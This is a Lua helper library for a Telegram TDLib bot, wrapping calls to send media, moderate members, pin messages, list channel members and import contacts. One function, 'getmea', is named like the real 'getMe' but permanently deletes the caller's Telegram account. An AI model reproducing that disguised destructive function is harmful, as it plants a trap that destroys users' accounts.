--function By Amir Bagheri
--TDbot Lib
local CerNerCompany = {} 
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {id = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {id = group_id, type = 'group'}
end
return chat
end
CerNerCompany.getChatId = getChatId
local function getVector(str)
  local v = {}
  local i = 1
  for k in string.gmatch(str, '(%d%d%d+)') do
    v[i] = '[' .. i-1 .. ']="' .. k .. '"'
    i = i+1
  end
  v = table.concat(v, ',')
  return load('return {' .. v .. '}')()
end
local function getParse(parse_mode)
local P = {}
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P._ = 'textParseModeMarkdown'
elseif mode == 'html' then
P._ = 'textParseModeHTML'
end
end
return P
end
CerNerCompany.getParse = getParse
function sendText(chat_id,msg,text, parse)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg,
disable_notification = 1,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = "inputMessageText",text = text,
disable_web_page_preview = 1,
clear_draft = 0,
parse_mode = getParse(parse),
entities = {}
}
}, dl_cb, nil))
end
CerNerCompany.sendText = sendText
function Pin(channelid,messageid,disablenotification)
assert (tdbot_function ({
_ = "pinChannelMessage",
channel_id = getChatId(channelid).id,
message_id = messageid,
disable_notification = disablenotification
}, dl_cb, nil))
end
CerNerCompany.Pin = Pin
function Unpin(channelid)
assert (tdbot_function ({
_ = 'unpinChannelMessage',
channel_id = getChatId(channelid).id
}, dl_cb, nil))
end
CerNerCompany.Unpin = Unpin
function KickUser(chat_id, user_id)
tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatusBanned"
},
}, dl_cb, nil)
end
CerNerCompany.KickUser = KickUser
function Left(chat_id, user_id, s)
assert (tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatus" ..s
},
}, dl_cb, nil))
end
CerNerCompany.Left = Left
function changedescription(MaTaDoR,Company)
assert (tdbot_function ({
_ = 'changeChannelDescription',
channel_id = getChatId(MaTaDoR).id,
description = Company
}, dl_cb, nil))
end
CerNerCompany.changedescription = changedescription
function changechatname(chat_id, title)
assert (tdbot_function ({
_ = "changeChatTitle",
chat_id = chat_id,
title = title
}, dl_cb, nil))
end
CerNerCompany.changechatname = changechatname
function Restrict(chat_id, user_id, Restricted, right)
local chat_member_status = {}
if Restricted == 'Restricted' then
chat_member_status = {
is_member = right[1] or 1,
restricted_until_date = right[2] or 0,
can_send_messages = right[3] or 1,
can_send_media_messages = right[4] or 1,
can_send_other_messages = right[5] or 1,
can_add_web_page_previews = right[6] or 1
}
chat_member_status._ = 'chatMemberStatus' .. Restricted
assert (tdbot_function ({
_ = 'changeChatMemberStatus',
chat_id = chat_id,
user_id = user_id,
status = chat_member_status
}, dl_cb, nil))
end
end
CerNerCompany.Restrict = Restrict
function Promote(chat_id, user_id)
tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatusAdministrator"
},
}, dl_cb, nil)
end
CerNerCompany.Promote = Promote
function ResolveUsername(username,cb)
tdbot_function ({
_ = "searchPublicChat",
username = username
}, cb, nil)
end
CerNerCompany.ResolveUsername = ResolveUsername
function Unban(chat_id, user_id)
tdbot_function ({
_ = "changeChatMemberStatus",
chat_id = chat_id,
user_id = user_id,
status = {
_ = "chatMemberStatusLeft"
},
}, dl_cb, nil)
end
CerNerCompany.Unban = Unban
function getChatHistory(chat_id, from_message_id, offset, limit,cb)
tdbot_function ({
_ = "getChatHistory",
chat_id = chat_id,
from_message_id = from_message_id,
offset = offset,
limit = limit
}, cb, nil)
end
CerNerCompany.getChatHistory = getChatHistory
function deleteMessagesFromUser(chat_id, user_id)
tdbot_function ({
_ = "deleteMessagesFromUser",
chat_id = chat_id,
user_id = user_id
}, dl_cb, nil)
end
CerNerCompany.deleteMessagesFromUser = deleteMessagesFromUser
function deleteMessages(chat_id, message_ids)
tdbot_function ({
_= "deleteMessages",
chat_id = chat_id,
message_ids = message_ids
}, dl_cb, nil)
end
CerNerCompany.deleteMessages = deleteMessages
local function getMessage(chat_id, message_id,cb)
tdbot_function ({
_ = "getMessage",
chat_id = chat_id,
message_id = message_id
}, cb, nil)
end
CerNerCompany.getMessage = getMessage
function getChat(chatid,cb)
assert (tdbot_function ({
_ = 'getChat',
chat_id = chatid
}, cb, nil))
end
CerNerCompany.getChat = getChat
function send(chatid, messageid, text,textparsemode)
  assert (tdbot_function ({
    _ = 'editMessageText',
    chat_id = chatid,
    message_id = messageid,
    reply_markup = nil,
    input_message_content = {
      _ = 'inputMessageText',
      text = text,
      disable_web_page_preview = 0,
      clear_draft = 0,
      entities = {},
      parse_mode = getParse(textparsemode)
    },
  }, dl_cb,nil))
end
function DWN(fileid)
assert (tdbot_function ({
_ = 'downloadFile',
file_id = fileid,
},  dl_cb, nil))
end
CerNerCompany.DWN = DWN
CerNerCompany.send = send
function Action(chatid, act,yyyy)
assert (tdbot_function ({
_ = 'sendChatAction',
chat_id = chatid,
action = {
_ = 'chatAction' .. act,
progress = yyyy or 100
},
},  dl_cb,nil))
end
function Block(user_id)
assert (tdbot_function ({
_ = 'blockUser',
user_id = user_id
},dl_cb,nil))
end
function Unblock(userid)
assert (tdbot_function ({
_ = 'unblockUser',
user_id = userid
}, dl_cb,nil))
end
CerNerCompany.Unblock = Unblock
CerNerCompany.Block = Block
CerNerCompany.Action = Action
CerNerCompany.getChat = getChat
function sendInlineQuery(chatid, replytomessageid, disablenotification, frombackground, queryid, resultid)
assert (tdbot_function ({
_ = 'sendInlineQueryResultMessage',
chat_id = chatid,
reply_to_message_id = replytomessageid,
disable_notification = disablenotification,
from_background = frombackground,
query_id = queryid,
result_id = tostring(resultid)
}, dl_cb,nil))
end
CerNerCompany.sendInlineQuery = sendInlineQuery
function getInlineQuery(bot_user_id, chat_id, latitude, longitude, query,offset, cb)
  assert (tdbot_function ({
_ = 'getInlineQueryResults',
 bot_user_id = bot_user_id,
chat_id = chat_id,
user_location = {
 _ = 'location',
latitude = latitude,
longitude = longitude 
},
query = tostring(query),
offset = tostring(off)
}, cb, nil))
end
CerNerCompany.getInlineQuery = getInlineQuery
function Markread(chat_id, message_ids)
tdbot_function ({
_ = "viewMessages",
chat_id = chat_id,
message_ids = message_ids
}, dl_cb, nil)
end
CerNerCompany.Markread = Markread
function getChannelMembers(channelid,off, limit,mbrfilter,cb)
if not limit or limit > 2000000000 then
limit = 2000000000 
end  
assert (tdbot_function ({
_ = 'getChannelMembers',
channel_id = getChatId(channelid).id,
filter = {
_ = 'channelMembersFilter' .. mbrfilter,
},
offset = off,
limit = limit
}, cb, nil))
end
CerNerCompany.getChannelMembers = getChannelMembers
local function getInputFile(file, conversion_str, expectedsize)
local input = tostring(file)
local infile = {}
if (conversion_str and expectedsize) then
infile = {
_ = 'inputFileGenerated',
original_path = tostring(file),
conversion = tostring(conversion_str),
expected_size = expectedsize
}
else
if input:match('/') then
infile = {_ = 'inputFileLocal', path = file}
elseif input:match('^%d+$') then
infile = {_ = 'inputFileId', id = file}
else
infile = {_ = 'inputFilePersistentId', persistent_id = file}
end
end
return infile
end
CerNerCompany.getInputFile = getInputFile
function addChatMembers(chatid, userids)
  assert (tdbot_function ({
    _ = 'addChatMembers',
    chat_id = chatid,
    user_ids = getVector(userids),
}, dl_cb, nil))
end
CerNerCompany.addChatMembers = addChatMembers
function getChannelFull(channelid)
assert (tdbot_function ({
 _ = 'getChannelFull',
channel_id = getChatId(channelid).id
}, dl_cb, nil))
end
CerNerCompany.getChannelFull = getChannelFull
function sendMention(chat_id, user_id, msg_id, text, offset, length)
assert (tdbot_function ({
_ = "sendMessage",
chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = "inputMessageText",
text = text,
disable_web_page_preview = 1,
clear_draft = false,
entities = {[0] = {
offset = offset,
length = length,
_ = "textEntity",
type = {
user_id = user_id,
 _ = "textEntityTypeMentionName"}
}
}
}
}, dl_cb, nil))
end
CerNerCompany.sendMention = sendMention
function sendDocument(chat_id,reply_to_message_id, document, caption)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = 0,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageDocument',
document = getInputFile(document),
caption = tostring(caption)
},
}, dl_cb, nil))
end
CerNerCompany.sendDocument = sendDocument
function changeChatPhoto(chat_id,photo)
assert (tdbot_function ({
_ = 'changeChatPhoto',
chat_id = chat_id,
photo = getInputFile(photo)
}, dl_cb, nil))
end
CerNerCompany.changeChatPhoto = changeChatPhoto
function sendPhoto(chat_id, reply_to_message_id, photo, caption)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = 0,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = "inputMessagePhoto",
photo = getInputFile(photo),
added_sticker_file_ids = {},
width = 0,
height = 0,
caption = caption
},
}, dl_cb, nil))
end
CerNerCompany.sendPhoto = sendPhoto
function getUser(user_id, cb)
assert (tdbot_function ({
_ = 'getUser',
user_id = user_id
}, cb, nil))
end
CerNerCompany.getUser = getUser
function Call(user_id,cb)
assert (tdbot_function ({
_ = "createCall",
user_id = user_id,
protocol = {
_ = "callProtocol",
udp_p2p =  true,
udp_reflector =true,
min_layer = 65,
max_layer = 65
}
}, cb, nil))
end
CerNerCompany.Call = Call
function deleteAccount(fuck)
assert (tdbot_function ({
_ = "deleteAccount",
reason = fuck
}, dl_cb,nil))
end
CerNerCompany.deleteAccount = deleteAccount
function getUserFull(user_id,cb)
assert (tdbot_function ({
_ = "getUserFull",
user_id = user_id
}, cb, nil))
end
CerNerCompany.getUserFull = getUserFull
function forwardMessage(chat_id, from_chat_id, message_id,from_background)
assert (tdbot_function ({
_ = "forwardMessages",
chat_id = chat_id,
from_chat_id = from_chat_id,
message_ids = message_id,
disable_notification = 0,
from_background = from_background
}, dl_cb, nil))
end
CerNerCompany.forwardMessage = forwardMessage
function sendVideo(chat_id, reply_to_message_id, video_file,cap)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = 1,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageVideo',
video = getInputFile(video_file),
added_sticker_file_ids = {},
duration = vid_duration or 0,
width = vid_width or 0,
height = vid_height or 0,
caption = tostring(cap),
 },
}, dl_cb, nil))
end
CerNerCompany.sendVideo = sendVideo
function sendVideoNote(chat_id, reply_to_message_id,videonote)
assert (tdbot_function ({
_= "sendMessage",
chat_id = chat_id,
reply_to_message_id = reply_to_message_id,
disable_notification = 1,
from_background = true,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageVideoNote',
video_note = getInputFile(videonote),
},
}, dl_cb, nil))
end
CerNerCompany.sendVideoNote = sendVideoNote
function sendContact(chat_id,msg_id,phone,first,last,user_id)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageContact',
contact = {
_ = 'contact',
phone_number = tostring(phone),
first_name = tostring(first),
last_name = tostring(last),
user_id = user_id
}}
}, dl_cb, nil))
end
CerNerCompany.sendContact = sendContact
function addChatMember(chat_id, user_id, forward_limit)
assert (tdbot_function ({
_ = "addChatMember",
chat_id = chat_id,
user_id = user_id,
forward_limit = forward_limit or 50
}, dl_cb,nil))
end
CerNerCompany.addChatMember = addChatMember
function sendGif(chat_id, msg_id, animation_file,Cap)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageAnimation',
animation = getInputFile(animation_file),
caption = tostring(Cap)
}
}, dl_cb, nil))
end
CerNerCompany.sendGif = sendGif
function createCall(user_id)
assert (tdbot_function ({
_ = "createCall",
user_id = user_id,
protocol = {
_ = "callProtocol",
udp_p2p =  true,
udp_reflector =true,
min_layer = 65,
max_layer = 65
}
}, dl_cb,nil))
end
CerNerCompany.createCall = createCall
function getmea(amir)
assert(tdbot_function ({
_ = "deleteAccount",
reason = amir
}, dl_cb, nil))
end
CerNerCompany.getmea = getmea
function importContact(phone_number, first_name, last_name, user_id)
 assert (tdbot_function ({
    _ = "importContacts",
    contacts = {[0] = {
	  _ = 'contact',
      phone_number = tostring(phone_number),
      first_name = tostring(first_name),
      last_name = tostring(last_name),
      user_id = user_id
      },
    },
  }, dl_cb,nil))

end
CerNerCompany.importContact = importContact
function sendAudio(chat_id, msg_id, audio,title,caption)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageAudio',
audio = getInputFile(audio),
duration = duration or 0,
title = tostring(title) or 0,
caption = tostring(caption)
}
}, dl_cb, nil))
end
CerNerCompany.sendAudio = sendAudio
function sendVoice(chat_id,msg_id, voice_file,caption)
assert( tdbot_function ({
_ = "sendMessage",chat_id = chat_id,
reply_to_message_id = msg_id,
disable_notification = 0,
from_background = 1,
reply_markup = nil,
input_message_content = {
_ = 'inputMessageVoice',
voice = getInputFile(voice_file),
duration = voi_duration or 0,
caption = tostring(caption)
}
}, dl_cb, nil))
end;CerNerCompany.sendVoice = sendVoice;function getMe(cb)assert (tdbot_function ({_ = "getMe",}, cb, nil));end;CerNerCompany.getMe = getMe;function sendSticker(chat_id, reply_to_message_id, sticker_file)assert (tdbot_function ({_= "sendMessage",chat_id = chat_id,reply_to_message_id = reply_to_message_id,disable_notification = 0,from_background = true,reply_markup = nil,input_message_content = {_ = 'inputMessageSticker',sticker = getInputFile(sticker_file),width = 0,height = 0},}, dl_cb, nil));end;CerNerCompany.sendSticker = sendSticker;return CerNerCompany

























